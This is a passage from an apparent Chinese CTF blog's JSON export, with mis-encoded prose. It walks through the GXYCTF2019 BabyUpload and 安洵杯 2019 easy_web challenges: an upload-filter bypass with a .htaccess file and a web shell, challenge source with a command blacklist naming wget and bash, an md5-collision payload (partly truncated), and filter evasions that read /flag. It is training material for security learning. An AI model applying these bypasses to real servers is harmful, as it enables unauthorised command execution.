href=\"#æ–¹æ³•ä¸‰ï¼šsessionæ–¹æ³•\" class=\"headerlink\" title=\"æ–¹æ³•ä¸‰ï¼šsessionæ–¹æ³•\"></a>æ–¹æ³•ä¸‰ï¼šsessionæ–¹æ³•</h3><p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027203733969.png\" alt=\"image-20201027203733969\"></p>\n<h2 id=\"GXYCTF2019-BabyUpload\"><a href=\"#GXYCTF2019-BabyUpload\" class=\"headerlink\" title=\"[GXYCTF2019]BabyUpload\"></a>[GXYCTF2019]BabyUpload</h2><p>è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ </p>\n<p>ä¸Šä¼ PHPæç¤ºä¸èƒ½ä¸Šä¼ åç¼€ä¸èƒ½æœ‰phï¼Œå¤§å°å†™åç¼€ç»•ä¸è¿‡ï¼Œè¿™æ ·çš„è¿‡æ»¤ï¼Œä¸€äº›å¸¸ç”¨çš„åæœ€éƒ½ç”¨ä¸äº†äº†ã€‚å…‰æ”¹åç¼€ä¸ºjpgï¼Œæç¤ºå¤ªéœ²éª¨äº†ï¼ŒæŠŠç±»å‹ä¸€èµ·æ”¹äº†å°±æç¤ºæ˜æ˜æ˜¯phpï¼Œé‚£å°±ä¸€èµ·ä»·æ ¼æ–‡ä»¶å¤´</p>\n<p>ç»è¿‡ä¸€ç•ªæ¢æŸ¥å‘ç°æ˜¯<code>&lt;?</code>è¢«è¿‡æ»¤äº†ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201028193002524.png\" alt=\"image-20201028193002524\"></p>\n<p>ä½¿ç”¨scriptè„šæœ¬æ–¹å¼ç»•è¿‡ï¼ŒæˆåŠŸä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201028193133997.png\" alt=\"image-20201028193133997\"></p>\n<p>antswordè¿æ¥get flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201028193403154.png\" alt=\"image-20201028193403154\"></p>\n<h2 id=\"å®‰æ´µæ¯-2019-easy-web\"><a href=\"#å®‰æ´µæ¯-2019-easy-web\" class=\"headerlink\" title=\"[å®‰æ´µæ¯ 2019]easy_web\"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>ä¸Šæ¥æ˜¯å›¾ç‰‡æ²¡æœ‰ä¸Šé¢ï¼Œçœ‹ä¸€ä¸‹æºç ï¼Œé‡Œé¢å†™ç€md5 is funny ~ï¼Œurlå¤„ä¼ å…¥äº†ä¸€ä¸ªimgå’Œcmd</p>\n<p>imgå¤„æ˜¯ä¸€ä¸ªbase64ç¼–ç ï¼šè§£åˆ°æœ€åæ˜¯3535352e706e67ï¼Œè¿™æ˜¯ä¸ª16è¿›åˆ¶ç¼–ç ï¼Œè§£å¼€åæ˜¯555.pngï¼Œè¿™è¯´æ˜ä¼šè¯»å–æ–‡ä»¶ä»¥base64å½¢å¼è¿”å›ã€‚åœ¨cmdå¤„è¾“å…¥å‘½ä»¤è¯•è¯•,è¾“å…¥lsï¼Œcatï¼Œ$ï¼Œæ˜¾ç¤ºè¢«ç¦æ­¢ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨å‰é¢çš„å›¾ç‰‡ç‚¹æ¥è·å–æºç ï¼Œå› ä¸ºä¹‹å‰æˆ‘ä»¬å‘ç°imagå¤„ä¼ å…¥çš„æ˜¯å…ˆå¯¹æ–‡ä»¶åè¿›è¡Œ16è¿›åˆ¶è½¬æ¢ï¼Œç„¶ååœ¨åšä¸¤æ¬¡base64ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å§index.phpåšå¦‚ä¸Šæ“ä½œï¼Œå°±å¯ä»¥å¾—åˆ°æºä»£ç ã€‚</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E_ALL</span> <span class=\"token operator\">||</span> <span class=\"token operator\">~</span> <span class=\"token constant\">E_NOTICE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'content-type:text/html;charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[^a-zA-Z0-9.]+/\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;img src =\"./ctf3.jpeg\">'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"xixiï½ no flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$txt</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src='data:image/gif;base64,\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$txt</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"'>&lt;/img>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|>/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"forbid ~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string backtick-quoted-string\">`$cmd`</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"md5 is funny ~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token selector\">body</span><span class=\"token punctuation\">&#123;</span>\n   <span class=\"token property\">background</span><span class=\"token punctuation\">:</span><span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>./bj.png<span class=\"token punctuation\">)</span></span>  no-repeat center center<span class=\"token punctuation\">;</span>\n   <span class=\"token property\">background-size</span><span class=\"token punctuation\">:</span>cover<span class=\"token punctuation\">;</span>\n   <span class=\"token property\">background-attachment</span><span class=\"token punctuation\">:</span>fixed<span class=\"token punctuation\">;</span>\n   <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>#CCCCCC<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>å¥½å®¶ä¼™è¿‡æ»¤äº†æŒºå¤šçš„å‘½ä»¤,æ²¡æ³•ç›´æ¥ç”¨æ•°ç»„ç»•è¿‡md5éªŒè¯ï¼Œå› ä¸ºæ•°ç»„çš„stringåéƒ½æ˜¯â€arrayâ€</p>\n<p>è€ƒå¯Ÿçš„æ—¶md5çš„å¼ºéªŒè¯ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªpayloadå¯ä»¥ç”¨ï¼š</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">a</span><span class=\"token operator\">=</span>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">b</span><span class=\"token operator\">=</span>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201029173207820.png\" alt=\"image-20201029173207820\"></p>\n<p>flagåœ¨æ ¹ç›®å½•ä¸‹</p>\n<p>catè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>\\</code>ç»•è¿‡ï¼Œæ¯”å¦‚ca\\t+/flagç»•è¿‡ï¼Œta\\c+/flagç»•è¿‡</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201029174831141.png\" alt=\"image-20201029174831141\"></p>\n<p>æˆ–è€…ä½¿ç”¨sortå‘½ä»¤ï¼Œsort+/flagæ¥ç»•è¿‡</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201029175028520.png\" alt=\"image-20201029175028520\"></p>\n","text":"[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ã€å›¾ç‰‡é©¬ ä¸Šä¼ ç»•è¿‡æ€ä¹ˆç»•å‘¢ï¼Œè¯•äº†ä¸Šä¼ php,php3ï¼Œphp4ï¼Œphtmléƒ½æ˜¯æ²¡è¿‡æ»¤äº†ã€‚è¯•äº†ä¸€ä¸‹jpgå’Œ.htaccessæ–‡ä»¶éƒ½å¯ä»¥ä¸Šä¼ ï¼Œæ‰€ä»¥å°±å¯ä»¥ä½¿ç”¨å›¾ç‰‡é©¬ï¼Œå¹¶ä¸”ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œå‹å¥½ã€‚ ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ AddType...","link":"","photos":[],"count_time":{"symbolsCount":"7.6k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2\"><span class=\"toc-text\">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MRCTF2020-Ez-bypass\"><span class=\"toc-text\">[MRCTF2020]Ez_bypass</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0\"><span class=\"toc-text\">[GKCTF2020]cveç‰ˆç­¾åˆ°</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-old-hack\"><span class=\"toc-text\">[BJDCTF 2nd]old-hack</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83\"><span class=\"toc-text\">[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Alocaleconv\"><span class=\"toc-text\">æ–¹æ³•ä¸€ï¼šlocaleconv()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Areverse\"><span class=\"toc-text\">æ–¹æ³•äºŒï¼šreverse()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9Asession%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">æ–¹æ³•ä¸‰ï¼šsessionæ–¹æ³•</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GXYCTF2019-BabyUpload\"><span class=\"toc-text\">[GXYCTF2019]BabyUpload</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web\"><span class=\"toc-text\">[å®‰æ´µæ¯ 2019]easy_web</span></a></li></ol>","author":{"name":"æ²å­é¾","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"çˆ±ä½ æ‰€çˆ±ï¼Œè¡Œä½ æ‰€è¡Œï¼Œå¬ä»ä½ å¿ƒï¼Œæ— é—®è¥¿ä¸œ","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"æ— å‚æ•°å‡½æ•°RCE","uid":"452153053cb456e93e9f321b6100ce19","slug":"æ— å‚æ•°å‡½æ•°RCE","date":"2020-10-27T08:24:44.000Z","updated":"2020-10-27T13:33:46.000Z","comments":true,"path":"api/articles/æ— å‚æ•°å‡½æ•°RCE.json","keywords":"A1andNS","cover":[],"text":"æœ€è¿‘åšé¢˜é‡åˆ°äº†æ— å‚æ•°å‡½æ•°æ¥RCEçš„é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ä¸€äº›æƒ³æ³•ï¼Œä»¥å¤‡åæ¥æŸ¥è¯ã€‚ è¿™ç§é¢˜ç›®çš„åšæ³•åŸºæœ¬ä¸Šå°±æ˜¯ï¼Œåˆ©ç”¨è¶…çº§å…¨å±€å˜é‡æ¥è¿›è¡Œbypassï¼Œåˆ©ç”¨å‡½æ•°çš„åµŒå¥—çš„æ›¿ä»£å‚æ•°çš„å‡ºç°ã€‚ç„¶åè¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚ æ— å‚æ•°å‡½æ•°é€šå¸¸æ¥è¯´å¦‚æœåœ¨PHPä¸­æœ‰ä¸€ä¸ªè¯­å¥ eval($_POST['cmd']); ...","link":"","photos":[],"count_time":{"symbolsCount":"5.9k","symbolsTime":"5 mins."},"categories":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","count":32,"path":"api/categories/å­¦ä¹ ç¬”è®°.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"Bypass","slug":"Bypass","count":1,"path":"api/tags/Bypass.json"}],"author":{"name":"æ²å­é¾","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"çˆ±ä½ æ‰€çˆ±ï¼Œè¡Œä½ æ‰€è¡Œï¼Œå¬ä»ä½ å¿ƒï¼Œæ— é—®è¥¿ä¸œ","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"CVE-2020-16898 Windows tcp/ipè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","uid":"78ded4e7cb4de2a6c1a7e1af4840fe78","slug":"CVE-2020-16898-Windows-tcp-ipè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","date":"2020-10-26T07:03:53.000Z","updated":"2020-10-26T08:24:54.000Z","comments":true,"path":"api/articles/CVE-2020-16898-Windows-tcp-ipè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°.json","keywords":"A1andNS","cover":[],"text":"è¿™ä¸ªæœˆçš„å¾®è½¯å®‰å…¨æ›´æ–°æ—¥ï¼Œå¾®è½¯å‘å¸ƒäº†è¡¥ä¸ä¿®å¤ï¼ŒTCP/IPè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´(CVE-2020-16898),å®˜æ–¹è¯„çº§ä¸¥é‡ï¼Œæ¼æ´è¯„åˆ†ï¼š 9.8ï¼Œè¿™é‡Œæ¥å¤ç°ä¸€ä¸‹æ¼æ´åˆ©ç”¨ï¼Œè‡³äºç…§æˆæ ˆæº¢å‡ºï¼Œæˆ‘å°±ä¸å¤ªçŸ¥é“ã€‚ æ¼æ´ç®€è¿°è¿œç¨‹æ”»å‡»è€…é€šè¿‡ æ„é€ ç‰¹åˆ¶çš„ICMPv6 Router Advertiseme...","link":"","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","count":5,"path":"api/categories/æ¼æ´å¤ç°.json"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","count":32,"path":"api/tags/ç½‘ç»œå®‰å…¨.json"},{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","count":6,"path":"api/tags/æ¼æ´å¤ç°.json"}],"author":{"name":"æ²å­é¾","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"çˆ±ä½ æ‰€çˆ±ï¼Œè¡Œä½ æ‰€è¡Œï¼Œå¬ä»ä½ å¿ƒï¼Œæ— é—®è¥¿ä¸œ","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}